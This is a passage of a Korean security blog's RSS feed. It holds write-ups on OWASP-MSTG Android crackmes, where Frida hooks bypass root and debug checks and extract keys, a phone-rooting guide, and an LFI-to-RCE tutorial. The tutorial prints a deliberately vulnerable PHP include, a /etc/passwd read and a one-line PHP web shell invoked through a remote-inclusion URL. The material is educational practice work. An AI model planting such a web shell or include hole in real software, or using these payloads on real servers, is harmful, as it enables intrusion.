      <category domain="https://blog.jhyeon.dev/tags/HACKINGCAMP/">HACKINGCAMP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4-%EB%B3%B4%EC%95%88/">정보 보안</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/">해킹캠프</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/21/hcamp22th/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>안드로이드 앱 모의해킹(OWASP-MSTG) LEVEL 2 풀이</title>
      <link>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/</link>
      <guid>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/</guid>
      <pubDate>Sat, 13 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;LEVEL-2&quot;&gt;&lt;a href=&quot;#LEVEL-2&quot; class=&quot;headerlink&quot; title=&quot;LEVEL 2&quot;&gt;&lt;/a&gt;LEVEL 2&lt;/h2&gt;&lt;p&gt;앞 포스팅에 이어서 LEVEL 2단계 어플리케이션 분석을 진행하겠습니다.&lt;/p&gt;
&lt;img </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h2><p>앞 포스팅에 이어서 LEVEL 2단계 어플리케이션 분석을 진행하겠습니다.</p><img src="/img/post/android_penetration2/1.png" class="lazyload" data-srcset="/img/post/android_penetration2/1.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration2/2.png" class="lazyload" data-srcset="/img/post/android_penetration2/2.png" srcset="data:image/png;base64,666"><p>APK 디컴파일 이후 MainActivity 구조를 보면 LEVEL1 단계에서 분석을 했던 것과 크게 차이는 없지만,</p><p>두 가지 변경 사항이 있습니다.</p><ol><li><p>Static Library 호출(foo)</p></li><li><p>AsyncTask 클래스 추가</p></li></ol><p>먼저 1번의 내용부터 보면 코드 내에서 foo라는 라이브러리를 호출하고 있습니다. 이는 라이브러리에서 함수를 정의해서 사용하는 의미가 있습니다.</p><p>그리고 AsyncTask의 역할은 백그라운드 작업인데, 디버깅 여부 탐지 로직에 들어간것으로 보아 백그라운드에서 돌아가면서 주기적으로 체크를 하는 것입니다.</p><p>아마도 이번 문제는 호출하는 라이브러리까지 타고 들어가서 코드를 분석해야만 풀리지 않을까라는 개인적인 생각을 합니다.</p><img src="/img/post/android_penetration2/3.png" class="lazyload" data-srcset="/img/post/android_penetration2/3.png" srcset="data:image/png;base64,666"><p>일단 이번앱에서도 Secret String 값을 찾아야 하는데, CodeCheck 메서드를 봤을 때 사진과 같이 smail 코드에선 아무런 내용이 작성되어 있지 않습니다.</p><p>다만, native method로 bar() 함수를 호출시켜서 동작하고 있는 것은 알 수 있습니다.</p><pre><code class="java">public class CodeCheck &#123;    private native boolean bar(byte[] bArr);    public boolean a(String str) &#123;        return bar(str.getBytes());    &#125;&#125;</code></pre><p>native method는 간단히, 리눅스 운영체제의 library(so) 파일을 로드해서 사용하는 것인데,</p><p>자세한 사항은 아래 링크에 정리가 잘 되어 있어서 참고하면 좋을 것 같다.</p><ul><li><a href="https://minhyeokism.tistory.com/27">https://minhyeokism.tistory.com/27</a></li></ul><img src="/img/post/android_penetration2/4.png" class="lazyload" data-srcset="/img/post/android_penetration2/4.png" srcset="data:image/png;base64,666"><p>그럼 이 라이브러리가 어디있을까?</p><p>APK 압축풀면 lib 폴더에 각 운영체제 환경별로 .so 라이브러리 파일이 있는데, 본인의 환경에 맞는 so만 분석하면 된다.</p><p>IDA로 해당 라이브러리 파일을 열어서 CodeCheck 메서드를 확인해보면, 사진과 같이 키 값을 확인할 수 있다.</p><img src="/img/post/android_penetration2/5.png" class="lazyload" data-srcset="/img/post/android_penetration2/5.png" srcset="data:image/png;base64,666"><p>그런데 후킹을 하지 않고 이렇게 코드 분석으로만 풀 수 있었던가.. 라는 생각을해서 후킹을 통해서도 값을 얻어보기로 했다.</p><p>이번에 후킹할 때는 native code로 작성된 것을 후킹해야 하기 때문에 frida의 <code> interceptor </code> 기능을 사용해야 한다.</p><ul><li><a href="https://frida.re/docs/javascript-api/#interceptor">https://frida.re/docs/javascript-api/#interceptor</a></li></ul><p><code> Interceptor.attach(target, callbacks) </code> 과 같이 사용하는데 target에 so 라이브러리와</p><p>callbacks엔 Module.getExportByName()로 메서드를 넣어주면 된다.</p><pre><code class="java">        Interceptor.attach(Module.getExportByName(&quot;libfoo.so&quot;, &quot;strncmp&quot;), &#123;            onEnter: function(args)&#123;                if(args[2].toInt32() == 23 &amp;&amp; Memory.readCString(args[0], 23) == &quot;12345678901234567890123&quot;)&#123;                    console.log(&quot;Find Key! : &quot; + Memory.readCString(args[1]));                &#125;            &#125;        &#125;)</code></pre><p>코드는 그렇게 어렵진 않고, libfoo.so 라이브러리 내 strncmp에 접근해서 onEnter 이벤트가 발생하면, 코드를 실행하도록 구조를 만들었다.</p><p><code> args[2].toInt32() == 23 </code> 처리를 해준 이유는 strncmp 함수를 실행하는 조건에 입력값 길이가 23을 만족해야 된다.</p><p>그래서 args[0] = 사용자 입력값에 23길이가 채워지면 <code> Memory.readCString() </code> 함수로 메모리에서 값을 읽도록 하였고, 아래와 같이</p><p>정상적으로 키 값을 얻어낼 수 있었다.</p><img src="/img/post/android_penetration2/6.png" class="lazyload" data-srcset="/img/post/android_penetration2/6.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration2/7.png" class="lazyload" data-srcset="/img/post/android_penetration2/7.png" srcset="data:image/png;base64,666"><p>근데, 중간중간에 디버깅 우회 로직을 안짜놔서 디버깅 탐지도 자꾸 되길래 임시 방편으로다가 후킹을 걸어놓았는데, 단순 임시방편이라..</p><p>다음편에는 안드로이드 어플리케이션 디버깅 우회 관련 포스팅을 작성해보고자 한다.</p><pre><code class="java">            debug_class.isDebuggerConnected.implementation = function()&#123;                console.log(&quot;Debug Hooked!&quot;);                return true;            &#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP-MSTG/">OWASP-MSTG</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>안드로이드 앱 모의해킹(OWASP-MSTG) 풀이</title>
      <link>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/</guid>
      <pubDate>Fri, 12 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;OWASP-MSTG란&quot;&gt;&lt;a href=&quot;#OWASP-MSTG란&quot; class=&quot;headerlink&quot; title=&quot;OWASP-MSTG란?&quot;&gt;&lt;/a&gt;OWASP-MSTG란?&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/OWAS</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="OWASP-MSTG란"><a href="#OWASP-MSTG란" class="headerlink" title="OWASP-MSTG란?"></a>OWASP-MSTG란?</h3><p><a href="https://github.com/OWASP/owasp-mstg">https://github.com/OWASP/owasp-mstg</a></p><p>모바일 어플리케이션 보안 진단을 위한 정보들과 모의 해킹을 할 수 있는 <code> Crackme </code> 같은 어플리케이션을 제공한다.</p><p>앱 다운로드는 아래 링크에서 가능하다.</p><p><a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes">https://github.com/OWASP/owasp-mstg/tree/master/Crackmes</a></p><hr><h3 id="분석-도구"><a href="#분석-도구" class="headerlink" title="분석 도구"></a>분석 도구</h3><ul><li><p>IDA(<a href="https://www.hex-rays.com/products/ida/">https://www.hex-rays.com/products/ida/</a>)</p></li><li><p>FRIDA(<a href="https://frida.re/">https://frida.re/</a>)</p></li><li><p>APKTOOLS(<a href="https://ibotpeaches.github.io/Apktool/">https://ibotpeaches.github.io/Apktool/</a>)</p></li><li><p>JADX(<a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a>)</p></li><li><p>JEB(<a href="https://www.pnfsoftware.com/">https://www.pnfsoftware.com/</a>)</p></li></ul><ul><li>adb command</li></ul><hr><h3 id="디바이스-amp-PC-연결"><a href="#디바이스-amp-PC-연결" class="headerlink" title="디바이스 &amp; PC 연결"></a>디바이스 &amp; PC 연결</h3><ul><li>해당 과정부터는 루팅 및 USB 디버깅 모드가 활성화 상태로만 가능합니다.</li></ul><p>루팅 과정을 하지 않으셨다면 이전 게시글을 보고 루팅을 해주세요! (글에서는 공기계 루팅을 대상으로 진행)</p><p>또, 공기계가 따로 없으신분들은 <code> Nox 가상 앱 플레이어 </code> 를 사용하셔도 무방합니다.</p><pre><code class="bash">adb devices # 연결된 디바이스 확인adb shell # 디바이스 쉘 접속su # root 권한 요청</code></pre><hr><h3 id="Frida-Server-Install"><a href="#Frida-Server-Install" class="headerlink" title="Frida Server Install"></a>Frida Server Install</h3><p>루팅이 완료되었다면, 이제 분석 디바이스에 Frdia Server 서비스를 설치하고 구동시켜야 한다. (Frida 분석 목적)</p><ul><li><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></li></ul><img src="/img/post/android_penetration/1.png" class="lazyload" data-srcset="/img/post/android_penetration/1.png" srcset="data:image/png;base64,666"><p>사진과 같이 Release 버전들이 업로드되어 있는데 본인의 디바이스 환경에 맞는 펌웨어를 선택해서 다운로드 받자.</p><p>본인의 디바이스 환경은 <code> adb shell </code> 환경에서 <code> cat /proc/cpuinfo </code> 명령어를 통해 확인할 수 있다.</p><p>다운로드가 완료되었으면, 아래 명령어를 통해 디바이스 로컬 저장소에 파일을 넣어준 뒤 실행하자.</p><pre><code class="bash">adb push &lt;filename&gt; /date/local/tmp./&lt;binary filename&gt; &amp;</code></pre><p>Frida Server를 실행시킨 뒤 <code> adb shell </code> 모드를 빠져나와서 아래 명령어를 입력해보자.</p><pre><code class="bash">frida-ps -U</code></pre><p>위 과정이 잘 진행이 되었다면 아래와 같은 목록이 표시될 것이다.</p><img src="/img/post/android_penetration/2.png" class="lazyload" data-srcset="/img/post/android_penetration/2.png" srcset="data:image/png;base64,666"><hr><h3 id="App-Analysis-1-Decompile-to-APK"><a href="#App-Analysis-1-Decompile-to-APK" class="headerlink" title="App Analysis(1) - Decompile to APK"></a>App Analysis(1) - Decompile to APK</h3><p>이제 본격적인 앱 분석을 위해 어플리케이션 디컴파일 과정을 거쳐 smail 코드를 볼 것이다.</p><p>디컴파일 도구로는 본문에 표시된 <code> apktool, jadx, jeb </code> 도구를 활용할 수 있다.</p><p>우선 apktools로 APK를 디컴파일 하는 과정은 아래 명령어로 수행할 수 있다.</p><pre><code class="bash">apktool d &lt;application&gt;</code></pre><img src="/img/post/android_penetration/3.png" class="lazyload" data-srcset="/img/post/android_penetration/3.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/4.png" class="lazyload" data-srcset="/img/post/android_penetration/4.png" srcset="data:image/png;base64,666"><p>어플리케이션 디컴파일이 완료되었다면 아래 사진과 같이 어플리케이션을 빌드한 파일들과 smail 코드가 나온다. </p><hr><h3 id="App-Analysis-2-Analyze-to-APK"><a href="#App-Analysis-2-Analyze-to-APK" class="headerlink" title="App Analysis(2) - Analyze to APK"></a>App Analysis(2) - Analyze to APK</h3><p>이제, 어플리케이션 디컴파일 과정을 거쳤다면 앱 로직에 대해서 분석해보는 단계이다.</p><img src="/img/post/android_penetration/5.png" class="lazyload" data-srcset="/img/post/android_penetration/5.png" srcset="data:image/png;base64,666"><p><code> JADX </code> 도구를 활용하면 위 사진과 같이 java 코드를 확인할 수 있으니 참고하도록 하자.</p><p>우선 다운로드 받은 APK를 루팅 기기에서 일반적으로 실행하면, 루팅 탐지 로직때문에 강제 종료가 된다.</p><p>그 로직을 분석한다음 우회를 해볼건데 하나씩 해보자</p><img src="/img/post/android_penetration/6.png" class="lazyload" data-srcset="/img/post/android_penetration/6.png" srcset="data:image/png;base64,666"><p>앱이 실행될 때 동작하는 onCreate() 함수 부분을 보면 <code> c.a(), c.b(), c.c() </code> 로직과 같이</p><p>루팅된 디바이스일 경우 탐지하는 로직과 디버깅 모드를 탐지하는 로직이 있다.</p><img src="/img/post/android_penetration/7.png" class="lazyload" data-srcset="/img/post/android_penetration/7.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/8.png" class="lazyload" data-srcset="/img/post/android_penetration/8.png" srcset="data:image/png;base64,666"><p>위 두 사진은 디바이스의 루팅 상태를 체크하는 로직, 디버깅 모드 여부를 체크하는 로직이다.</p><p>루팅의 경우 다들 아실만한 <code> SuperSu </code> 관련 파일들이 눈에 띄게 보인다.</p><p>뭐.. 아무튼 시스템 경로나 루팅과 연관된 파일을 검사하는 정도이고</p><p>두 번째 사진에서는 <code> context.getApplicationContext().getApplicationInfo().flags </code> 이 부분이 디버깅 모드 상태를 확인하는 것이다.</p><p>위 두가지 로직에 하나라도 해당되는 상태라면, 앱이 정상적으로 실행되지 않고. exit() 함수가 실행되어 앱이 종료될 것이다.</p><hr><h3 id="App-Analysis-3-Root-Detected-Bypass"><a href="#App-Analysis-3-Root-Detected-Bypass" class="headerlink" title="App Analysis(3) - Root Detected Bypass"></a>App Analysis(3) - Root Detected Bypass</h3><p>그럼 루팅이 감지되었을 때 우회하는 방법은 어떻게 될까.</p><p>위에서 분석해봤듯이, 루팅이나 디버깅 체크 로직에 탐지될 경우 exit() 함수가 실행되는데 이 함수를 후킹해서</p><p>자신이 원하는 흐름으로 흘러가게 할 수 있다. (exit() 함수가 동작하지 않도록 한다거나..)</p><img src="/img/post/android_penetration/9.png" class="lazyload" data-srcset="/img/post/android_penetration/9.png" srcset="data:image/png;base64,666"><p>위 경우 Frida로 특정 함수를 후킹해서 진행할 수 있는데 예제 코드는 사진과 같다.</p><img src="/img/post/android_penetration/10.png" class="lazyload" data-srcset="/img/post/android_penetration/10.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration/11.png" class="lazyload" data-srcset="/img/post/android_penetration/11.png" srcset="data:image/png;base64,666"><p>코드를 뚝딱하고나서 앱 실행 -&gt; 코드 실행을 해보면 사진과 같이 exit() 함수가 후킹되었다고 출력되고,</p><p>실제 앱에서 봤을 때도 exit() 함수가 실행되지 않아 앱이 작동하는 화면이다.</p><hr><h3 id="App-Analysis-4-Get-Secret-Key"><a href="#App-Analysis-4-Get-Secret-Key" class="headerlink" title="App Analysis(4) - Get Secret Key"></a>App Analysis(4) - Get Secret Key</h3><img src="/img/post/android_penetration/12.png" class="lazyload" data-srcset="/img/post/android_penetration/12.png" srcset="data:image/png;base64,666"><p>루팅 탐지 우회만이 끝이 아니다. 앱을 보면 특정 키값을 입력하여 확인하는 로직이 있다.</p><p>a.a() 조건을 만족할 경우 Success 제목과 correct 메세지를 띄워주고, 그게 아니라면 Nope..(try again) 문구를 띄운다.</p><img src="/img/post/android_penetration/13.png" class="lazyload" data-srcset="/img/post/android_penetration/13.png" srcset="data:image/png;base64,666"><p>키를 만들것 같은 부분은 a.a() 에 존재하는데 해당 로직을 따라가면 사진과 같이 확인할 수 있다.</p><p>8d127684cbc37c17616d806cf50473cc 이 값을 b()에 넣고</p><p>5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 값을 Base64-Decode 한 값을 <code> sg.vantagepoint.a.a.a </code></p><p>함수를 호출하여 bArr 라는 변수에 저장하게 됩니다.</p><p>이후 bArr에 저장된 값과 입력한 값을 비교하여 return (true/false)를 반환 해주고 있다.</p><p>따라서, 키 값을 만들어주는 함수를 후킹해서 값을 확인할 것이다.</p><pre><code class="java">Java.perform(function() &#123;    var secret_class = Java.use(&quot;sg.vantagepoint.a.a&quot;);        secret_class.a.implementation = function(arr1, arr2)&#123;        var retval = this.a(arr1, arr2);        var secret_msg = &quot;&quot;;        for(var i=0; i &lt; retval.length; i++)&#123;            secret_msg += String.fromCharCode(retval[i]);        &#125;        console.log(&quot;[*] Secret Method Hooking!!&quot;);        console.log(secret_msg);        return retval;        &#125;&#125;);</code></pre><p>후킹하는 코드는 간단하다. exit() 함수를 후킹할 때와 비슷한 방향으로 진행하면 되는데</p><p><code> sg.vantagepoint.a.a.a </code> 는 인자가 2개이기 때문에 그에 맞게 인자를 처리해주고,</p><p>for문을 활용해서 fromCharCode(문자열 변환) 함수로 변수하나를 지정해서 키 값을 저장해주면 된다.</p><img src="/img/post/android_penetration/14.png" class="lazyload" data-srcset="/img/post/android_penetration/14.png" srcset="data:image/png;base64,666"><p>결과로 Secret key 값을 정상적으로 얻어낼 수 있다.</p><h3 id="기타"><a href="#기타" class="headerlink" title="기타"></a>기타</h3><p>본문에 사용된 코드는 아래 깃허브에서 확인할 수 있습니다.</p><p>다음편에서 계속…</p><ul><li><a href="https://github.com/jhye0n/android_frida_python">https://github.com/jhye0n/android_frida_python</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP-MSTG/">OWASP-MSTG</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(스터디 자료) 안드로이드 앱 분석 기초 part.1</title>
      <link>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/</guid>
      <pubDate>Sun, 31 Jan 2021 06:09:52 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAx</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p><a href="https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAxTVYLEak8ih4F/view?usp=sharing">https://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAxTVYLEak8ih4F/view?usp=sharing</a></p><p>해당 자료를 활용한 무단 배포 등의 행위는 금지합니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Study/">Study</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>넥서스 5X 벽돌폰 복구 + 루팅</title>
      <link>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/</guid>
      <pubDate>Sat, 30 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;벽돌폰-계기&quot;&gt;&lt;a href=&quot;#벽돌폰-계기&quot; class=&quot;headerlink&quot; title=&quot;벽돌폰 계기&quot;&gt;&lt;/a&gt;벽돌폰 계기&lt;/h3&gt;&lt;p&gt;최근에 BoB 프로젝트 때 썼던 도구들도 있고 이를 바탕으로 앱 모의해킹 한번 시도해보고자&lt;/p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="벽돌폰-계기"><a href="#벽돌폰-계기" class="headerlink" title="벽돌폰 계기"></a>벽돌폰 계기</h3><p>최근에 BoB 프로젝트 때 썼던 도구들도 있고 이를 바탕으로 앱 모의해킹 한번 시도해보고자</p><p>잠들어있던 Nexus 5X 공기계를 살려냈다.</p><p>근데 이폰이 루팅만 해놓고 몇번 테스트용도로만 쓰다가 안써왔더니 터치도 안되고 해서 그냥 포맷하고</p><p>다시 루팅을 걸어서 앱 분석을 하려고 했으나.. 루팅 하는 과정에서 실수(?)로 인하여 벽돌폰을 만들어버렸다. (ㅎㅎ)</p><img src="/img/post/android_root/1.jpeg" class="lazyload" data-srcset="/img/post/android_root/1.jpeg" srcset="data:image/png;base64,666"><p>그래서 <code> Nexus Root Toolkit 2.19 </code> 프로그램을 써서 복구를 했는데 과정은 크게 어렵진 않아서 생략한다.</p><p>다만 이 프로그램이 패치가 2년전?부터 중단했기 때문에 펌웨어는 다소 구버전 일 수 있으나 살려내는게 큰 목적이라면 이것도 상관없다.</p><h3 id="루팅-재-시도"><a href="#루팅-재-시도" class="headerlink" title="루팅 재 시도"></a>루팅 재 시도</h3><p>이번에 루팅을 할 때는 그냥 수동으로 oem unlock 걸고 해서 한 방법인데 아래와 같이 수행했다.</p><ul><li>OEM 잠금 해제 -&gt; USB 디버깅 활성화</li></ul><img src="/img/post/android_root/2.jpeg" class="lazyload" data-srcset="/img/post/android_root/2.jpeg" srcset="data:image/png;base64,666"><img src="/img/post/android_root/3.jpeg" class="lazyload" data-srcset="/img/post/android_root/3.jpeg" srcset="data:image/png;base64,666"><hr><ul><li>안드로이드 스튜디오 &amp; platform tools 설치</li></ul><p><a href="https://developer.android.com/studio/install?hl=ko">https://developer.android.com/studio/install?hl=ko</a></p><hr><ul><li>디바이스랑 PC를 USB로 연결해서 adb 사용</li></ul><pre><code class="bash">adb devices # 현재 현결된 디바이스 확인adb reboot bootloader # 부트로더 화면으로 재부팅fastboot oem unlock # oem unlockfastboot reboot # 재부팅</code></pre><hr><ul><li>TWRP Recovery 도구 설치</li></ul><p><a href="https://dl.twrp.me/bullhead/">https://dl.twrp.me/bullhead/</a></p><hr><ul><li>루팅(1)</li></ul><pre><code class="bash">adb reboot bootloaderfastboot flash recovery &lt;imgfile&gt;adb reboot bootloader</code></pre><ul><li>SuperSU 다운로드</li></ul><pre><code class="bash">adb push BETA-SuperSU-v2.66-20160103015024.zip /sdcard/</code></pre><p>이런 과정이 사실 좀 복잡한데, 위에 언급됐던 <code> Nexus Root Toolkit 2.19 </code></p><p>써서 원클릭으로 루팅도 가능하니 알아두자..</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Root/">Root</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Nexus5X/">Nexus5X</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>LFI를 활용한 RCE 연계하기</title>
      <link>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</link>
      <guid>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</guid>
      <pubDate>Fri, 22 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 </description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 수 있는지 작성하기로 했었다.</p><p>이번 글에서는 RCE(Remote Code Execution)을 연계하는 방법에 대해서 적어볼 것이다.</p><h3 id="LFI-amp-RFI-개념"><a href="#LFI-amp-RFI-개념" class="headerlink" title="LFI &amp; RFI 개념"></a>LFI &amp; RFI 개념</h3><p>LFI(Local File Inclusion) 취약점은 <code> 내부 서버 </code> 파일을 읽어올 수 있는 취약점입니다.<br>RFI(Remote File Inclusion) 취약점은 <code> 외부 서버 </code> 로 부터의 파일을 읽어올 수 있는 취약점입니다.</p><p>즉, 내부에서 불러오는 것과 외부에서 불러온다는 점에서 약간의 차이가 있지만 두 취약점의 역할은 동일합니다.</p><h3 id="테스트-1-LFI-환경-만들기"><a href="#테스트-1-LFI-환경-만들기" class="headerlink" title="테스트(1) LFI 환경 만들기"></a>테스트(1) LFI 환경 만들기</h3><p>우선 LFI를 테스트해볼 환경을 간단하게만 만들어보겠습니다.</p><p><code> test.php(테스트 페이지) </code></p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt; test page &lt;/title&gt;&lt;/head&gt;&lt;body&gt;get&lt;?php include($_GET[&#39;page&#39;]);?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>코드에는 LFI 취약점을 발생시키기 위한 include 함수만을 사용하였고, 나머지는 표준 html 작성 방식입니다.</p><p>이제 해당 코드에서 page 인자를 통한 내부 파일을 로드시켜보겠습니다.</p><p><code> ?page=/etc/passwd </code></p><img src="/img/post/lfi_to_rce/lfi.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/lfi.png" srcset="data:image/png;base64,666"><p>서버 내부의 /etc/passwd 파일을 정상적으로 읽어오면서 화면에 출력이 가능하게 됩니다.</p><p>이런 공격을 바로 LFI 취약점이라고 할 수 있고 여기서 조금 더 연계해서 RCE까지 가봅시다.</p><h3 id="테스트-2-LFI-amp-RCE"><a href="#테스트-2-LFI-amp-RCE" class="headerlink" title="테스트(2) LFI &amp; RCE"></a>테스트(2) LFI &amp; RCE</h3><p>우선 Remote(외부) 환경의 파일을 로드하기 위해 설정 해야 할 옵션들이 있습니다.</p><blockquote><p>(php.ini)</p></blockquote><ol><li>allow_url_include = On</li></ol><p>웹을 실제로 운영할 때는 이런 옵션 하나하나 숙지하시고 관리를 잘 해주셔야 하고 평상시에는 On으로 두시면 안됩니다.</p><p>이후, 아래 웹 쉘을 실행시키는 페이로드를 간단하게 짜서 페이지에 로드시켜보겠습니다.</p><p><code> payload.php </code></p><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><p>그러면, test.php(메인 테스트 페이지)에서 해당 파일을 어떻게 불러올 수 있을까요.</p><p><code> ?page=http://~~/payload.php?cmd=pwd </code></p><p>이런 공격 URL이 나오게 되겠죠.</p><p>payload.php를 불러와서 현재 페이지에 로드시켜보면 다음과 같이 웹 쉘을 작동시킬 수 있습니다.</p><img src="/img/post/lfi_to_rce/payresult.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/payresult.png" srcset="data:image/png;base64,666">]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/RCE/">RCE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/LFI/">LFI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(GitHub) Hexo Blog 설치하기!</title>
      <link>https://blog.jhyeon.dev/2021/01/20/hexoblog-210120/</link>
      <guid>https://blog.jhyeon.dev/2021/01/20/hexoblog-210120/</guid>
      <pubDate>Tue, 19 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Hexo-Intro&quot;&gt;&lt;a href=&quot;#Hexo-Intro&quot; class=&quot;headerlink&quot; title=&quot;Hexo Intro&quot;&gt;&lt;/a&gt;Hexo Intro&lt;/h3&gt;&lt;p&gt;해당 포스트에서는 Hexo를 사용한 GitHub 블로그 운영에 대해서</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Hexo-Intro"><a href="#Hexo-Intro" class="headerlink" title="Hexo Intro"></a>Hexo Intro</h3><p>해당 포스트에서는 Hexo를 사용한 GitHub 블로그 운영에 대해서 소개해볼까 한다.</p><img src="/img/post/github/github.png" class="lazyload" data-srcset="/img/post/github/github.png" srcset="data:image/png;base64,666"><p>우선 사진과 같이 Github Blog 생성을 위한 새 Repo를 만들어주자.</p><p>Repo명은 자신의 github name과 동일하게 만들어야 한다. (ex. jhye0n.github.io)</p><p>이후 하단에 ADD a README file 옵션을 선택하고 생성하자 (해당 옵션은 README.md 파일을 미리 만들어주는 옵션)</p><p>그리고 보면, <code> 자신의계정명.github.io </code> 라는 Repo가 만들어지는데 이제 로컬에서 Hexo를 설치해보자.</p><h3 id="Hexo-Installation"><a href="#Hexo-Installation" class="headerlink" title="Hexo Installation"></a>Hexo Installation</h3><p>Hexo는 우선 Node.js 기반으로 동작하는 프레임워크이므로, 시스템에 node.js 설치를 필요로 한다.</p><ul><li>Node.js (<a href="https://nodejs.org/ko/">https://nodejs.org/ko/</a>)</li></ul><p>설치가 완료되었다면 터미널을 열어서 다음과 같은 명령어를 입력하자.</p><p>“블로그 폴더 경로는 본인의 선택”</p><pre><code class="bash">npm install hexo-cli -g</code></pre><p>터미널에 해당 명령어를 입력하면 hexo를 설치하게 될 것이다. 이후 블로그를 생성하는 